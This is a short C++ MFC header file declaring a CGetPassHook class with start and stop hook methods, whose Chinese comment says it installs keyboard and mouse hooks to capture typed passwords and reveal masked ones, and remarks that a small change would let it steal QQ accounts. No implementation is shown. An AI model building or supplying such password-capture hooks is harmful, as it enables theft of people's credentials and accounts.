// GetPassHook.h: interface for the CGetPassHook class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_GETPASSHOOK_H__6BD8BF04_D7D6_413F_9D92_0BCC6958389B__INCLUDED_)
#define AFX_GETPASSHOOK_H__6BD8BF04_D7D6_413F_9D92_0BCC6958389B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
//========================================
//功能：通过安装鼠标，键盘HOOK，达到实现劫获输入的密码的功能。
//可以移动鼠标到*号处显示*号真实密码，
//主要技术：SetWindowsHookEx,EnumChildWindows
//应用平台：98/2000/xp/2003测试通过
//开发坏境：VC++6.0
//作者：独孤寒哮 （爱家联盟工作室）
//QQ:1368077
//Email:blode@peoplemail.com.cn
//大家可以稍做修改就可以起到QQ盗号功能
//希望与广大VC爱好者交流
//=======================================

class AFX_EXT_CLASS CGetPassHook : public CObject  
{
public:
	BOOL StopHook();
	BOOL StartHook(HWND hwnd);
	
	CGetPassHook();
	virtual ~CGetPassHook();

};

#endif // !defined(AFX_GETPASSHOOK_H__6BD8BF04_D7D6_413F_9D92_0BCC6958389B__INCLUDED_)
